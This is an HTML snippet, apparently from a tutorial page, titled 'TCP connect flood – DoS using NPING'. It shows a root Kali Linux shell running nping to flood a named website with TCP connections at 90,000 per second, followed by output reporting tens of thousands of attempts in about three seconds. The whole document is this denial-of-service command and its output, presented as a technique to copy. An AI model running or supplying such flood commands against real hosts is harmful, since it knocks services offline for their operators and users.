<h4 style="padding:0px;margin:25px 0px 10px;outline:none;list-style:none;border:0px none;box-sizing:border-box;font-weight:normal;line-height:1em;font-family:Lora, serif;font-size:18px;color:#FF6200;white-space:normal;background-color:#FFFFFF;">
	<span style="padding:0px;margin:0px;outline:none;list-style:none;border:0px none;box-sizing:border-box;color:#993300;">
	<h4 style="padding:0px;margin:25px 0px 10px;outline:none;list-style:none;border:0px none;box-sizing:border-box;font-weight:normal;line-height:1em;font-family:Lora, serif;font-size:18px;color:#FF6200;white-space:normal;background-color:#FFFFFF;">
		<span style="padding:0px;margin:0px;outline:none;list-style:none;border:0px none;box-sizing:border-box;color:#993300;">TCP connect flood – DoS using NPING</span>
	</h4>
<pre style="padding:1em;margin-top:0px;margin-bottom:1em;outline:none;list-style:none;border-width:1px;border-style:solid;border-color:#E1E1E1 #F0F0F0 #F0F0F0 #E1E1E1;border-image:initial;box-sizing:border-box;direction:ltr;background:#333333;font-stretch:normal;line-height:19px;overflow-x:auto;overflow-y:hidden;color:#DFDFDF;clear:both;border-radius:2px;">root@kali:~# nping --tcp-connect -rate=90000 -c 900000 -q www.hping3testsite.com 
Starting Nping 0.6.46 ( http://nmap.org/nping ) at 2014-08-21 16:20 EST
^CMax rtt: 7.220ms | Min rtt: 0.004ms | Avg rtt: 1.684ms
TCP connection attempts: 21880 | Successful connections: 5537 | Failed: 16343 (74.69%)
Nping done: 1 IP address pinged in 3.09 seconds
root@kali:~#</pre>
</span>
</h4>